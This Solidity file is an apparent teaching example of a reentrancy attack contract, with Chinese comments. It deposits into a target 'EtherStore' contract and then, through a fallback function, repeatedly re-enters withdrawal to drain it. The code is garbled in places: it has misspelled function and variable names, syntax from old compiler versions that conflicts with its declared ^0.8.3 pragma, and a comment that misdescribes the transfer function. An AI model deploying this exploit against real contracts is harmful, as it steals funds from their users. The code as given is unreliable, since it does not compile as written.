// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract Attack{

    EtherStore public etherStore;
    //示例化另一个合约
    constructor(address _etherStoreAddress){
        etherStore = EtherStore(_etherStoreAddress);
    }

    //主合约 进行存款与取款操作
    function pwnEtherStore() public payable{
        //取款时必须大于一个eth
        require(msg.value >= 1 ether);
        //发送ether 到etherstore合约的depositFunds 函数
        etherStore.depositFinds.value(1 ether)();
        //调用 etherstore 合约的withdrawfunds函数
        etherStore.withdarwFunds(1 ether);
    }

    //查看当前用户的余额
    function collectEther() public {
        msg.sneder.transfer(this.balance);
    }

    //fallback 它是一个没有名字的函数
    //这个函数不需要声明，不需要拥有参数，不需要拥有返回值
    //当调用的函数找不到时，就会调用默认的fallback函数
    function() payable{

        if (etherStore.balance > 1 ether){
            etherStore.withdarwFunds(1 ether);
        }
    }
}
